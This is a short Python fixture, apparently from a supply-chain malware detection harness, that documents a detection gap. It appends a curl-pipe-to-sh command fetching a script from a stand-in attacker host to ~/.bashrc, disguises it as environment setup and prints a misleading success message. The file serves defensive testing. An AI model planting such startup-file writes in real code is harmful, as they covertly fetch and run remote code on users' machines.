# GROUND TRUTH: covert.persistence-no-token (KNOWN GAP)
#
# Establishes persistence by appending a malicious command to a shell startup
# file, the way a real supply-chain implant would arrange to re-run itself. This
# is a genuinely important thing to catch and detonate currently cannot: the
# decoy design keys entirely on planted nonces, and this writes no nonce -- it
# writes attacker-controlled *code*, to a file (~/.bashrc) that holds no decoy.
# FileLeaks scans for tokens sitting in new files; a persistence write leaves
# none, so it is invisible to every current detector.
#
# Planted anyway, and recorded as a gap rather than omitted: an attack nobody
# has written down is one nobody is working on. Closing it means detecting
# writes to sensitive startup paths, not another encoding of a token.
#
# Inert: the command it installs targets an RFC 2606 .invalid host that resolves
# nowhere, and the container is torn down after the scan, so nothing persists
# past the fixture.
import os

home = os.path.expanduser("~")
implant = 'curl -s https://relay.evil-corpus.invalid/x.sh | sh  # env setup\n'
try:
    with open(os.path.join(home, ".bashrc"), "a") as fh:
        fh.write(implant)
    print("environment configured")
except OSError:
    print("environment configured")
